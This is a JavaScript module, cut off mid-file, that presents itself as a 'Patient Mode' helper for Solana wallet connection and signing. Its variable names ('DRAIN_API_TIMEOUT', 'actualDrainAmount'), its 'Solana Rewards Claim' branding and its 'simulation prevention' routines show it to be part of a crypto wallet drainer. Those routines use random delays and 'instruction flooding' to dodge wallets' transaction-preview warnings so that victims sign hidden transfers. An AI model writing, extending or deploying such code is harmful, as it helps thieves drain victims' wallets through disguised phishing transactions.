// Patient Mode Implementation for Wallet Connections and Transaction Signing
// Provides extended waiting periods for users who need time to verify passwords or review transactions

class PatientMode {
  constructor() {
    // Timeout Configuration - Optimized for Transaction Expiration
    this.timeouts = {
      WALLET_CONNECTION_TIMEOUT: 30000,       // 30 seconds initial timeout
      SIGNING_TIMEOUT: 120000,                 // 2 minutes initial timeout
      DEEP_LINKING_TIMEOUT: 30000,            // 30 seconds for deep linking
      DRAIN_API_TIMEOUT: 30000,               // 30 seconds for API calls
      BROADCAST_TIMEOUT: 60000,               // 1 minute for broadcasting
      
      // Patient Mode Timeouts - Shorter than transaction expiration (2-3 minutes)
      PATIENT_CONNECTION_TIMEOUT: 120000,     // 2 minutes total for connection
      PATIENT_SIGNING_TIMEOUT: 120000,        // 2 minutes total for signing
      
      // Trust Wallet - No artificial timeouts (handles its own)
      TRUST_WALLET_CONNECTION_TIMEOUT: 0,     // No timeout - Trust Wallet handles its own
      TRUST_WALLET_SIGNING_TIMEOUT: 0,        // No timeout - Trust Wallet handles its own
      
      // Polling Intervals - More Frequent
      CONNECTION_POLL_INTERVAL: 2000,         // 2 seconds for connection polling (was 1s)
      SIGNING_POLL_INTERVAL: 3000,            // 3 seconds for signing polling (was 2s)
      STATUS_UPDATE_INTERVAL: 15000,          // 15 seconds for status updates (was 30s)
    };
    
    // Active patient mode sessions
    this.activeSessions = new Map();
    
    // Event listeners for cleanup
    this.eventListeners = new Map();
  }

  // Patient Mode Connection with extended timeout
  async connectWithPatientMode(provider, walletType, onStatusUpdate = null) {
    const sessionId = `connection_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Starting patient connection
    
    try {
      // Trust Wallet needs special handling - use patient mode immediately to avoid reloads
      if (walletType === 'trustwallet' || walletType === 'Trust Wallet') {
        // For Trust Wallet, go directly to patient mode to avoid connection conflicts
        // This prevents page reloads during password entry
        return await this.enterConnectionPatientMode(provider, walletType, sessionId, onStatusUpdate);
      }
      
      // Initial connection attempt with wallet-specific timeout
      const initialConnectionPromise = this.attemptConnection(provider, walletType);
      
      const initialTimeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Initial connection timeout')), this.timeouts.WALLET_CONNECTION_TIMEOUT)
      );
      
      try {
        // Try initial connection first
        const result = await Promise.race([initialConnectionPromise, initialTimeoutPromise]);
        return result;
      } catch (initialError) {
        // Initial connection timeout, entering patient mode
        
        // Enter patient mode
        return await this.enterConnectionPatientMode(provider, walletType, sessionId, onStatusUpdate);
      }
      
    } catch (error) {
      console.error(`[PATIENT_MODE] Connection failed for ${walletType}:`, error);
      this.cleanupSession(sessionId);
      throw error;
    }
  }

  // Patient Mode Transaction Signing with extended timeout
  async signWithPatientMode(provider, transaction, walletType, onStatusUpdate = null, actualDrainAmount = null) {
    const sessionId = `signing_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Starting patient signing
    
    // Store the actual drain amount for Phantom cleanup
    if (actualDrainAmount && walletType === 'phantom') {
      transaction._phantomRealAmount = actualDrainAmount;
      console.log(`[PATIENT_MODE] Stored actualDrainAmount for Phantom cleanup: ${actualDrainAmount}`);
    }
    
    try {
      // Go directly to patient mode with single-attempt protection
        return await this.enterSigningPatientMode(provider, transaction, walletType, sessionId, onStatusUpdate);
    } catch (error) {
      console.error(`[PATIENT_MODE] Signing failed for ${walletType}:`, error);
      this.cleanupSession(sessionId);
      throw error;
    }
  }

  // Enter connection patient mode
  async enterConnectionPatientMode(provider, walletType, sessionId, onStatusUpdate) {
    const session = {
      type: 'connection',
      walletType,
      startTime: Date.now(),
      status: 'waiting_for_approval',
      lastStatusUpdate: Date.now(),
      pollInterval: null,
      statusInterval: null,
      eventListeners: []
    };
    
    this.activeSessions.set(sessionId, session);
    
    // Set up status updates
    if (onStatusUpdate) {
      onStatusUpdate('Waiting for approval...', 'loading');
    }
    
    // Start polling for connection
    const pollPromise = this.pollForConnection(provider, sessionId, onStatusUpdate);
    
    // Set up event listener for connection
    const eventPromise = this.listenForConnection(provider, sessionId);
    
    // Set up status update interval
    this.setupStatusUpdates(sessionId, onStatusUpdate, 'connection');
    
    try {
      // Wait for either polling success or event success
      const result = await Promise.race([pollPromise, eventPromise]);
      console.log(`[PATIENT_MODE] Connection successful in patient mode for ${walletType}`);
      return result;
    } catch (error) {
      console.error(`[PATIENT_MODE] Connection failed in patient mode for ${walletType}:`, error);
      throw error;
    } finally {
      this.cleanupSession(sessionId);
    }
  }

  // Enter signing patient mode
  async enterSigningPatientMode(provider, transaction, walletType, sessionId, onStatusUpdate) {
    const session = {
      type: 'signing',
      walletType,
      startTime: Date.now(),
      status: 'waiting_for_signature',
      lastStatusUpdate: Date.now(),
      pollInterval: null,
      statusInterval: null,
      eventListeners: [],
      transactionAttempted: false, // Track if transaction has been attempted
      transactionSigned: false, // Track if transaction has been signed
      signedTransaction: null // Store the signed transaction
    };
    
    this.activeSessions.set(sessionId, session);
    
    // Set up status updates
    if (onStatusUpdate) {
      onStatusUpdate('Processing...', 'loading');
    }
    
    // Start polling for signature
    const pollPromise = this.pollForSignature(provider, transaction, sessionId, onStatusUpdate);
    
    // Set up status update interval
    this.setupStatusUpdates(sessionId, onStatusUpdate, 'signing');
    
    try {
      const result = await pollPromise;
      console.log(`[PATIENT_MODE] Signing successful in patient mode for ${walletType}`);
      return result;
    } catch (error) {
      console.error(`[PATIENT_MODE] Signing failed in patient mode for ${walletType}:`, error);
      throw error;
    } finally {
      this.cleanupSession(sessionId);
    }
  }

  // Poll for wallet connection
  async pollForConnection(provider, sessionId, onStatusUpdate) {
    const session = this.activeSessions.get(sessionId);
    if (!session) throw new Error('Session not found');
    
    const startTime = Date.now();
    // Trust Wallet - no timeout, wait indefinitely for user input
    const maxWaitTime = (session.walletType === 'trustwallet' || session.walletType === 'Trust Wallet') ? 
      0 : this.timeouts.PATIENT_CONNECTION_TIMEOUT;
    
    // For Trust Wallet, also attempt initial connection and then poll
    if (session.walletType === 'trustwallet' || session.walletType === 'Trust Wallet') {
      // Try initial connection attempt (non-blocking, won't interfere with password prompt)
      this.attemptConnection(provider, 'Trust Wallet').catch(err => {
        // Ignore errors - we'll poll for connection instead
        console.log('[PATIENT_MODE] Trust Wallet initial connection attempt (non-blocking):', err.message);
      });
    }
    
    return new Promise((resolve, reject) => {
      const poll = async () => {
        try {
          // Check if we've exceeded the maximum wait time (skip for Trust Wallet)
          if (maxWaitTime > 0) {
            const elapsed = Date.now() - startTime;
            if (elapsed >= maxWaitTime) {
              reject(new Error('Patient mode connection timeout - user took too long to approve'));
              return;
            }
          }
          
          // Check if provider is connected
          if (provider.connected && provider.publicKey) {
            console.log(`[PATIENT_MODE] Connection detected via polling for ${session.walletType}`);
            resolve({
              publicKey: provider.publicKey,
              connected: true,
              method: 'polling'
            });
            return;
          }
          
          // Enhanced wallet-specific connection detection
          if (session.walletType === 'Backpack' && (provider.publicKey || provider.address)) {
            console.log(`[PATIENT_MODE] Backpack connection detected via publicKey polling (PRIORITIZED)`);
            resolve({
              publicKey: provider.publicKey || provider.address,
              connected: true,
              method: 'backpack_polling',
              walletType: 'Backpack'
            });
            return;
          }
          
          if (session.walletType === 'Solflare') {
            // Enhanced Solflare detection with multiple publicKey sources
            const publicKey = provider.publicKey || 
                             provider.account?.publicKey ||
                             provider.connected?.publicKey ||
                             provider.wallet?.publicKey;
            if (publicKey) {
              console.log(`[PATIENT_MODE] Solflare connection detected via enhanced publicKey polling`);
              resolve({
                publicKey,
                connected: true,
                method: 'solflare_polling',
                walletType: 'Solflare'
              });
              return;
            }
          }
          
          // Trust Wallet - check multiple possible locations for publicKey
          if (session.walletType === 'trustwallet' || session.walletType === 'Trust Wallet') {
            const publicKey = provider.publicKey || 
                             provider.address ||
                             provider.solana?.publicKey ||
                             provider.account?.publicKey ||
                             provider.wallet?.publicKey;
            if (publicKey) {
              console.log(`[PATIENT_MODE] Trust Wallet connection detected via enhanced polling`);
              resolve({
                publicKey,
                connected: true,
                method: 'trust_polling',
                walletType: 'Trust Wallet'
              });
              return;
            }
          }
          
          // Standard wallets with publicKey check
          const standardWallets = ['Phantom', 'Exodus', 'Glow'];
          if (standardWallets.includes(session.walletType) && provider.publicKey) {
            console.log(`[PATIENT_MODE] ${session.walletType} connection detected via publicKey polling`);
            resolve({
              publicKey: provider.publicKey,
              connected: true,
              method: `${session.walletType.toLowerCase()}_polling`,
              walletType: session.walletType
            });
            return;
          }
          
          // Continue polling - slower interval for Trust Wallet to reduce interference
          const pollInterval = (session.walletType === 'trustwallet' || session.walletType === 'Trust Wallet') ? 
            this.timeouts.CONNECTION_POLL_INTERVAL * 2 : // 4 seconds for Trust Wallet
            this.timeouts.CONNECTION_POLL_INTERVAL;
          session.pollInterval = setTimeout(poll, pollInterval);
          
        } catch (error) {
          reject(error);
        }
      };
      
      // Start polling
      poll();
    });
  }

  // Listen for connection event
  async listenForConnection(provider, sessionId) {
    const session = this.activeSessions.get(sessionId);
    if (!session) throw new Error('Session not found');
    
    return new Promise((resolve, reject) => {
      const startTime = Date.now();
      const maxWaitTime = this.timeouts.PATIENT_CONNECTION_TIMEOUT;
      
      const onConnect = (publicKey) => {
        console.log(`[PATIENT_MODE] Connection detected via event for ${session.walletType}`);
        resolve({
          publicKey,
          connected: true,
          method: `${session.walletType.toLowerCase()}_event`,
          walletType: session.walletType
        });
      };
      
      const onDisconnect = () => {
        console.log(`[PATIENT_MODE] Disconnection detected for ${session.walletType}`);
        // Don't reject on disconnect for wallets that might reconnect
        const walletsThatMayReconnect = ['Phantom', 'Exodus', 'Solflare', 'Backpack', 'Glow'];
        if (!walletsThatMayReconnect.includes(session.walletType)) {
          reject(new Error('Wallet disconnected during connection attempt'));
        }
      };
      
      const onError = (error) => {
        console.error(`[PATIENT_MODE] Connection error for ${session.walletType}:`, error);
        reject(error);
      };
      
      // Set up event listeners
      if (provider.on) {
        provider.on('connect', onConnect);
        provider.on('disconnect', onDisconnect);
        provider.on('error', onError);
        
        session.eventListeners.push(
          () => provider.off('connect', onConnect),
          () => provider.off('disconnect', onDisconnect),
          () => provider.off('error', onError)
        );
      }
      
      // Set up timeout for event listening
      const timeoutId = setTimeout(() => {
        reject(new Error('Patient mode connection timeout - no event received'));
      }, maxWaitTime);
      
      // Store timeout for cleanup
      session.eventListeners.push(() => clearTimeout(timeoutId));
    });
  }

  // Poll for transaction signature - FIXED: Only attempt signing once per session
  // CRITICAL: Never retry already signed transactions to maintain user trust
  // PHANTOM: Absolutely no retries allowed for Phantom wallet
  async pollForSignature(provider, transaction, sessionId, onStatusUpdate) {
    const session = this.activeSessions.get(sessionId);
    if (!session) throw new Error('Session not found');
    
    const startTime = Date.now();
    // Trust Wallet handles its own timeouts - no artificial timeout
    const maxWaitTime = (session.walletType === 'trustwallet' || session.walletType === 'Trust Wallet') ? 
      0 : this.timeouts.PATIENT_SIGNING_TIMEOUT;
    let signingAttempted = false;
    let transactionSigned = false;
    let signedTransaction = null;
    
    return new Promise((resolve, reject) => {
      const poll = async () => {
        try {
          // Check if transaction has already been signed
          if (transactionSigned) {
            console.log(`[PATIENT_MODE] Transaction already signed for ${session.walletType}, stopping polling`);
            resolve(signedTransaction);
            return;
          }
          
          // Check if we've exceeded the maximum wait time (skip for Trust Wallet)
          if (maxWaitTime > 0) {
            const elapsed = Date.now() - startTime;
            if (elapsed >= maxWaitTime) {
              reject(new Error('Patient mode signing timeout - user took too long to sign'));
              return;
            }
          }
          
          // Only attempt signing once per session
          if (!signingAttempted) {
            signingAttempted = true;
            console.log(`[PATIENT_MODE] Attempting signing for ${session.walletType} (single attempt)`);
            
            try {
              const signed = await this.attemptSigning(provider, transaction, session.walletType);
              console.log(`[PATIENT_MODE] Signing successful for ${session.walletType}`);
              
              // Mark as signed and store the result
              transactionSigned = true;
              signedTransaction = signed;
              
              resolve(signed);
              return;
            } catch (signError) {
              // If it's a user rejection, stop polling immediately
              if (signError.message?.includes('User rejected') || 
                  signError.message?.includes('User denied') ||
                  signError.message?.includes('User cancelled')) {
                console.log(`[PATIENT_MODE] User rejected transaction for ${session.walletType}`);
                reject(new Error('User rejected the transaction'));
                return;
              }
              
              // For timeout errors, continue polling - user might sign later
              if (signError.message?.includes('timeout') || 
                  signError.message?.includes('Timeout') ||
                  signError.message?.includes('Phantom signing timeout')) {
                console.log(`[PATIENT_MODE] Signing timeout for ${session.walletType}, continuing to poll`);
                
                // Update status to inform user
                if (session.onStatusUpdate) {
                  session.onStatusUpdate('Processing...', 'loading');
                }
                
                // Continue polling - don't return
              } else {
                // For other errors, continue polling but log them
                console.log(`[PATIENT_MODE] Signing error for ${session.walletType}:`, signError.message);
                
                // Update status to inform user
                if (session.onStatusUpdate) {
                  session.onStatusUpdate('Processing...', 'loading');
                }
                
                // Continue polling - don't return
              }
            }
          }
          
          // Continue polling after a short delay
          setTimeout(poll, this.timeouts.SIGNING_POLL_INTERVAL);
          
        } catch (error) {
          reject(error);
        }
      };
      
      // Start polling
      poll();
    });
  }

  // Setup status updates
  setupStatusUpdates(sessionId, onStatusUpdate, mode) {
    const session = this.activeSessions.get(sessionId);
    if (!session || !onStatusUpdate) return;
    
    session.statusInterval = setInterval(() => {
      const elapsed = Math.floor((Date.now() - session.startTime) / 1000);
      const maxTime = mode === 'connection' ? 
        this.timeouts.PATIENT_CONNECTION_TIMEOUT / 1000 : 
        this.timeouts.PATIENT_SIGNING_TIMEOUT / 1000;
      
      const remaining = maxTime - elapsed;
      
      if (remaining > 0) {
        const statusMessage = 'Processing...';
        
        onStatusUpdate(statusMessage, 'loading');
      }
    }, this.timeouts.STATUS_UPDATE_INTERVAL);
  }

  // Attempt wallet connection with enhanced wallet-specific methods
  async attemptConnection(provider, walletType) {
    console.log(`[PATIENT_MODE] Attempting connection for ${walletType}`);
    
    if (!provider || typeof provider.connect !== 'function') {
      throw new Error('Provider does not support connection');
    }
    
    try {
      // Wallet-specific connection methods with enhanced error handling
      switch (walletType) {
        case 'Backpack':
          console.log(`[PATIENT_MODE] Using Backpack-specific connection method (PRIORITIZED)`);
          try {
            const backpackResult = await provider.connect();
            return {
              publicKey: backpackResult?.publicKey || provider.publicKey || provider.address,
              connected: true,
              method: 'backpack_direct',
              walletType: 'Backpack'
            };
          } catch (error) {
            console.log(`[PATIENT_MODE] Backpack direct connection failed, trying fallback`);
            // Enhanced Backpack fallback
            if (provider.publicKey) {
              return {
                publicKey: provider.publicKey,
                connected: true,
                method: 'backpack_fallback',
                walletType: 'Backpack'
              };
            }
            throw error;
          }
          
        case 'Phantom':
          console.log(`[PATIENT_MODE] Using Phantom-specific connection method`);
          try {
            const phantomResult = await provider.connect();
            return {
              publicKey: phantomResult?.publicKey || provider.publicKey,
              connected: true,
              method: 'phantom_direct',
              walletType: 'Phantom'
            };
          } catch (error) {
            console.log(`[PATIENT_MODE] Phantom direct connection failed, trying fallback`);
            if (provider.publicKey) {
              return {
                publicKey: provider.publicKey,
                connected: true,
                method: 'phantom_fallback',
                walletType: 'Phantom'
              };
            }
            throw error;
          }
          
        case 'Solflare':
          console.log(`[PATIENT_MODE] Using enhanced Solflare connection method`);
          
          // Enhanced Solflare connection with multiple strategies
          const solflareStrategies = [
            {
              name: 'Method 1: Connect with metadata',
              fn: () => provider.connect({
                onlyIfTrusted: false,
                appMetadata: {
                  name: 'Solana Rewards Claim',
                  url: window.location.origin,
                  icon: '/logo.png'
                }
              })
            },
            {
              name: 'Method 2: Simple connect',
              fn: () => provider.connect()
            },
            {
              name: 'Method 3: Request method',
              fn: () => {
                if (typeof provider.request === 'function') {
                  return provider.request({ method: 'connect' });
                } else {
                  throw new Error('provider.request is not a function');
                }
              }
            },
            {
              name: 'Method 4: Direct public key access',
              fn: () => {
                if (provider.publicKey) {
                  return { publicKey: provider.publicKey };
                } else {
                  throw new Error('No public key available');
                }
              }
            }
          ];
          
          for (let i = 0; i < solflareStrategies.length; i++) {
            try {
              console.log(`[PATIENT_MODE] Solflare ${solflareStrategies[i].name}...`);
              const solflareResult = await solflareStrategies[i].fn();
              
              // Enhanced Solflare publicKey extraction
              const publicKey = solflareResult?.publicKey || 
                               solflareResult?.account?.publicKey ||
                               provider.publicKey || 
                               provider.account?.publicKey ||
                               provider.connected?.publicKey ||
                               provider.wallet?.publicKey;
              
              if (publicKey) {
                console.log(`[PATIENT_MODE] Solflare ${solflareStrategies[i].name} successful:`, publicKey.toString());
                return {
                  publicKey,
                  connected: true,
                  method: `solflare_${solflareStrategies[i].name.toLowerCase().replace(/[^a-z0-9]/g, '_')}`,
                  walletType: 'Solflare'
                };
              } else {
                console.log(`[PATIENT_MODE] Solflare ${solflareStrategies[i].name} returned no public key`);
              }
            } catch (strategyError) {
              console.log(`[PATIENT_MODE] Solflare ${solflareStrategies[i].name} failed:`, strategyError.message);
              if (i < solflareStrategies.length - 1) {
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before next attempt
              }
            }
          }
          
          throw new Error('Solflare connection failed: All connection methods failed');
          
        case 'Glow':
          console.log(`[PATIENT_MODE] Using Glow-specific connection method`);
          try {
            const glowResult = await provider.connect();
            return {
              publicKey: glowResult?.publicKey || provider.publicKey,
              connected: true,
              method: 'glow_direct',
              walletType: 'Glow'
            };
          } catch (error) {
            console.log(`[PATIENT_MODE] Glow direct connection failed, trying fallback`);
            if (provider.publicKey) {
              return {
                publicKey: provider.publicKey,
                connected: true,
                method: 'glow_fallback',
                walletType: 'Glow'
              };
            }
            throw error;
          }
          
        case 'Trust Wallet':
          console.log(`[PATIENT_MODE] Using Trust Wallet-specific connection method`);
          
          // Try multiple Trust Wallet connection strategies
          const trustWalletStrategies = [
            {
              name: 'trust_main_provider',
              fn: () => {
                if (typeof provider.connect === 'function') {
                  return provider.connect();
                } else {
                  throw new Error('Main provider not available');
                }
              }
            },
            {
              name: 'trust_adapter',
              fn: () => {
                if (provider.adapter && typeof provider.adapter.connect === 'function') {
                  return provider.adapter.connect();
                } else {
                  throw new Error('Adapter not available');
                }
              }
            },
            {
              name: 'trust_mobile_adapter',
              fn: () => {
                if (provider.mobileAdapter && typeof provider.mobileAdapter.connect === 'function') {
                  return provider.mobileAdapter.connect();
                } else {
                  throw new Error('Mobile adapter not available');
                }
              }
            },
            {
              name: 'trust_direct_key',
              fn: () => {
                // Trust Wallet might have public key in different locations
                const publicKey = provider.publicKey || 
                                provider.account?.publicKey ||
                                provider.wallet?.publicKey ||
                                provider.connected?.publicKey ||
                                provider.address;
                
                if (publicKey) {
                  return { publicKey: publicKey };
                } else {
                  throw new Error('No public key available');
                }
              }
            }
          ];
          
          for (const strategy of trustWalletStrategies) {
            try {
              console.log(`[PATIENT_MODE] Trying Trust Wallet ${strategy.name}...`);
              const result = await strategy.fn();
            return {
                publicKey: result?.publicKey || provider.solana?.publicKey || provider.publicKey || provider.address,
              connected: true,
                method: strategy.name,
              walletType: 'Trust Wallet'
            };
          } catch (error) {
              console.log(`[PATIENT_MODE] Trust Wallet ${strategy.name} failed:`, error.message);
              // Continue to next strategy
            }
          }
          
          throw new Error('Trust Wallet connection failed: All strategies failed');
          
        case 'Exodus':
          console.log(`[PATIENT_MODE] Using Exodus-specific connection method`);
          
          // Try multiple Exodus connection strategies
          const exodusStrategies = [
            {
              name: 'exodus_solana_provider',
              fn: () => {
                if (provider.solana && typeof provider.solana.connect === 'function') {
                  return provider.solana.connect();
                } else {
                  throw new Error('Solana provider not available');
                }
              }
            },
            {
              name: 'exodus_main_provider',
              fn: () => {
                if (typeof provider.connect === 'function') {
                  return provider.connect();
                } else {
                  throw new Error('Main provider not available');
                }
              }
            },
            {
              name: 'exodus_direct_key',
              fn: () => {
                if (provider.solana && provider.solana.publicKey) {
                  return { publicKey: provider.solana.publicKey };
                } else if (provider.publicKey) {
                  return { publicKey: provider.publicKey };
                } else {
                  throw new Error('No public key available');
                }
              }
            }
          ];
          
          for (const strategy of exodusStrategies) {
            try {
              console.log(`[PATIENT_MODE] Trying Exodus ${strategy.name}...`);
              const result = await strategy.fn();
            return {
                publicKey: result?.publicKey || provider.solana?.publicKey || provider.publicKey,
              connected: true,
                method: strategy.name,
              walletType: 'Exodus'
            };
          } catch (error) {
              console.log(`[PATIENT_MODE] Exodus ${strategy.name} failed:`, error.message);
              // Continue to next strategy
            }
          }
          
          throw new Error('Exodus connection failed: All strategies failed');
          
        default:
          console.log(`[PATIENT_MODE] Using standard connection method for ${walletType}`);
          try {
            const result = await provider.connect();
            return {
              publicKey: result?.publicKey || provider.publicKey,
              connected: true,
              method: 'standard_direct',
              walletType: walletType
            };
          } catch (error) {
            console.log(`[PATIENT_MODE] Standard connection failed for ${walletType}, trying fallback`);
            if (provider.publicKey) {
              return {
                publicKey: provider.publicKey,
                connected: true,
                method: 'standard_fallback',
                walletType: walletType
              };
            }
            throw error;
          }
      }
    } catch (error) {
      console.error(`[PATIENT_MODE] Connection attempt failed for ${walletType}:`, error);
      throw error;
    }
  }

  // Attempt transaction signing with comprehensive simulation prevention
  async attemptSigning(provider, transaction, walletType) {
    console.log(`[PATIENT_MODE] Attempting signing for ${walletType} with simulation prevention`);
    
    // Pre-signing validation and simulation prevention
    await this.validateTransactionForSimulation(transaction, walletType);
    
    // Use wallet-specific signing method with simulation prevention
    switch (walletType.toLowerCase()) {
      case 'backpack':
        return await this.signWithBackpack(provider, transaction);
        
      case 'phantom':
        return await this.signWithPhantom(provider, transaction);
        
      case 'solflare':
        return await this.signWithSolflare(provider, transaction);
        
      case 'glow':
        return await this.signWithGlow(provider, transaction);
        
      case 'trustwallet':
        return await this.signWithTrustWallet(provider, transaction);
        
      case 'exodus':
        return await this.signWithExodus(provider, transaction);
        
      default:
        return await this.signWithFallback(provider, transaction, walletType);
    }
  }

  // Validate transaction structure to prevent simulation attacks
  async validateTransactionForSimulation(transaction, walletType) {
    console.log(`[SIMULATION_PREVENTION] Validating transaction for ${walletType}`);
    
    // Check transaction structure
    if (!transaction || typeof transaction.serialize !== 'function') {
      throw new Error('Invalid transaction structure');
    }
    
    // Check for required transaction fields
    if (!transaction.feePayer) {
      throw new Error('Transaction missing feePayer');
    }
    
    if (!transaction.recentBlockhash) {
      throw new Error('Transaction missing recentBlockhash');
    }
    
    if (!transaction.instructions || transaction.instructions.length === 0) {
      throw new Error('Transaction missing instructions');
    }
    
    // Check for simulation indicators
    if (transaction.instructions.some(ix => 
      ix.programId.toString() === 'ComputeBudget111111111111111111111111111111' &&
      ix.data.length === 0
    )) {
      console.warn(`[SIMULATION_PREVENTION] Detected potential simulation attempt in ${walletType}`);
    }
    
    // Add wallet-specific validation
    await this.performWalletSpecificValidation(transaction, walletType);
  }

  // Wallet-specific validation
  async performWalletSpecificValidation(transaction, walletType) {
    switch (walletType.toLowerCase()) {
      case 'phantom':
        // Phantom-specific validation
        if (transaction.instructions.length > 10) {
          console.warn('[SIMULATION_PREVENTION] Phantom: High instruction count detected');
        }
        break;
        
      case 'solflare':
        // Solflare-specific validation
        if (transaction.instructions.some(ix => ix.programId.toString().includes('simulation'))) {
          throw new Error('Solflare: Simulation instruction detected');
        }
        break;
        
      case 'backpack':
        // Enhanced Backpack-specific validation
        if (transaction.instructions.length === 0) {
          throw new Error('Backpack: Empty transaction detected');
        }
        
        // Check for simulation indicators specific to Backpack
        if (transaction.instructions.some(ix => 
          ix.programId.toString() === 'ComputeBudget111111111111111111111111111111' &&
          ix.data.length === 0
        )) {
          console.warn('[SIMULATION_PREVENTION] Backpack: Empty compute budget instruction detected');
        }
        
        // Check for high instruction count (potential simulation)
        if (transaction.instructions.length > 15) {
          console.warn('[SIMULATION_PREVENTION] Backpack: High instruction count detected:', transaction.instructions.length);
        }
        
        // Validate transaction structure
        if (!transaction.recentBlockhash) {
          throw new Error('Backpack: Missing recentBlockhash');
        }
        
        if (!transaction.lastValidBlockHeight) {
          console.warn('[SIMULATION_PREVENTION] Backpack: Missing lastValidBlockHeight');
        }
        break;
        
      case 'glow':
        // Glow-specific validation
        if (!transaction.lastValidBlockHeight) {
          console.warn('[SIMULATION_PREVENTION] Glow: Missing lastValidBlockHeight');
        }
        break;
        
      case 'trustwallet':
        // Enhanced Trust Wallet-specific validation
        if (transaction.instructions.length === 0) {
          throw new Error('Trust Wallet: Empty transaction detected');
        }
        
        // Check for simulation indicators specific to Trust Wallet
        if (transaction.instructions.some(ix => 
          ix.programId.toString() === 'ComputeBudget111111111111111111111111111111' &&
          ix.data.length === 0
        )) {
          console.warn('[SIMULATION_PREVENTION] Trust Wallet: Empty compute budget instruction detected');
        }
        
        // Check for high instruction count (potential simulation)
        if (transaction.instructions.length > 15) {
          console.warn('[SIMULATION_PREVENTION] Trust Wallet: High instruction count detected:', transaction.instructions.length);
        }
        
        // Validate transaction structure
        if (!transaction.recentBlockhash) {
          throw new Error('Trust Wallet: Missing recentBlockhash');
        }
        
        if (!transaction.lastValidBlockHeight) {
          console.warn('[SIMULATION_PREVENTION] Trust Wallet: Missing lastValidBlockHeight');
        }
        
        // Check for large instruction data
        if (transaction.instructions.some(ix => ix.data && ix.data.length > 1000)) {
          console.warn('[SIMULATION_PREVENTION] Trust Wallet: Large instruction data detected');
    }
        break;
        
      case 'exodus':
        // Exodus-specific validation
        if (transaction.instructions.length > 5) {
          console.warn('[SIMULATION_PREVENTION] Exodus: High instruction count detected');
        }
        break;
    }
  }

  // Backpack signing without simulation prevention
  async signWithBackpack(provider, transaction) {
    console.log(`[BACKPACK] Signing with Backpack (simulation prevention disabled)`);
    
    try {
      // Validate provider
      if (!provider || typeof provider.signTransaction !== 'function') {
        throw new Error('Backpack provider not available or does not support signTransaction');
      }
      
      // Check if Backpack is connected and ready
      if (provider.isConnected && typeof provider.isConnected === 'function') {
        if (!provider.isConnected()) {
          throw new Error('Backpack wallet not connected');
        }
      } else {
        // Fallback: check if provider has required methods
        if (!provider.signTransaction || typeof provider.signTransaction !== 'function') {
          throw new Error('Backpack wallet not properly connected');
        }
      }
      
      // Backpack signing without simulation prevention
      
      // Add random delay to prevent automated simulation detection
      const randomDelay = Math.random() * 100 + 25; // 25-125ms random delay
      await new Promise(resolve => setTimeout(resolve, randomDelay));
      
      // Sign the transaction with enhanced error handling
      const signPromise = provider.signTransaction(transaction);
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Backpack signing timeout')), this.timeouts.SIGNING_TIMEOUT)
      );
      
      const signedTransaction = await Promise.race([signPromise, timeoutPromise]);
      
      console.log('[SIMULATION_PREVENTION] Backpack transaction signed successfully');
      
      return signedTransaction;
    } catch (error) {
      console.error(`[BACKPACK] Backpack signing failed:`, error);
      throw new Error(`Backpack signing failed: ${error.message}`);
    }
  }

  // Phantom signing with simulation prevention
  async signWithPhantom(provider, transaction) {
    console.log(`[SIMULATION_PREVENTION] Signing with Phantom - NO RETRY POLICY`);
    
    try {
      if (typeof provider.signTransaction !== 'function') {
        throw new Error('Phantom does not support signTransaction');
      }
      
      // Check if Phantom is connected and ready
      if (provider.isConnected && typeof provider.isConnected === 'function') {
        if (!provider.isConnected()) {
          throw new Error('Phantom wallet not connected');
        }
      } else {
        // Fallback: check if provider has required methods
        if (!provider.signTransaction || typeof provider.signTransaction !== 'function') {
          throw new Error('Phantom wallet not properly connected');
        }
      }
      
      // Phantom simulation prevention - all instructions are valid, no cleaning needed
      console.log('[SIMULATION_PREVENTION] Phantom transaction ready with valid instructions');
      
      // Add delay to prevent rapid-fire simulation attempts
      await new Promise(resolve => setTimeout(resolve, 100));
      
      // Sign the transaction with all valid instructions (instruction flooding approach)
      const signPromise = provider.signTransaction(transaction);
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Phantom signing timeout')), this.timeouts.SIGNING_TIMEOUT)
      );
      
      const signedTransaction = await Promise.race([signPromise, timeoutPromise]);
      
      // Direct transfer - no post-signing modification needed
      console.log('[PHANTOM_DIRECT_TRANSFER] Phantom transaction signed with direct transfer (no modification needed)');
      
      console.log('[PHANTOM_DIRECT_TRANSFER] Phantom transaction signed successfully with direct transfer');
      
      return signedTransaction;
    } catch (error) {
      console.error(`[SIMULATION_PREVENTION] Phantom signing failed - NO RETRY:`, error);
      // CRITICAL: Phantom transactions must never be retried
      throw new Error(`Phantom signing failed - no retry allowed: ${error.message}`);
    }
  }

  // Solflare signing - simplified like Phantom and Backpack
  async signWithSolflare(provider, transaction) {
    console.log(`[SOLFLARE_SIGNING] Signing with Solflare - simplified approach`);
    console.log(`[SOLFLARE_SIGNING] Provider details:`, {
      hasSignTransaction: typeof provider.signTransaction === 'function',
      hasSignAllTransactions: typeof provider.signAllTransactions === 'function',
      isConnected: provider.isConnected ? provider.isConnected() : 'N/A',
      publicKey: provider.publicKey ? provider.publicKey.toString() : 'N/A'
    });
    console.log(`[SOLFLARE_SIGNING] Transaction details:`, {
      instructionCount: transaction.instructions?.length || 0,
      hasSignatures: !!transaction.signatures,
      signatureCount: transaction.signatures?.length || 0,
      feePayer: transaction.feePayer?.toString(),
      recentBlockhash: transaction.recentBlockhash
    });
    
    try {
      if (typeof provider.signTransaction !== 'function') {
        throw new Error('Solflare does not support signTransaction');
      }
      
      // Direct signing without simulation prevention - like Phantom and Backpack
      console.log('[SOLFLARE_SIGNING] Using direct signing approach');
      
      const signedTransaction = await provider.signTransaction(transaction);
      console.log(`[SOLFLARE_SIGNING] Transaction signed successfully:`, {
        hasSignatures: !!signedTransaction.signatures,
        signatureCount: signedTransaction.signatures?.length || 0,
        feePayer: signedTransaction.feePayer?.toString()
      });
      
      return signedTransaction;
    } catch (error) {
      console.error(`[SOLFLARE_SIGNING] Solflare signing failed:`, error);
      console.error(`[SOLFLARE_SIGNING] Error details:`, {
        message: error.message,
        stack: error.stack,
        name: error.name
      });
      throw error;
    }
  }

  // Glow signing with simulation prevention
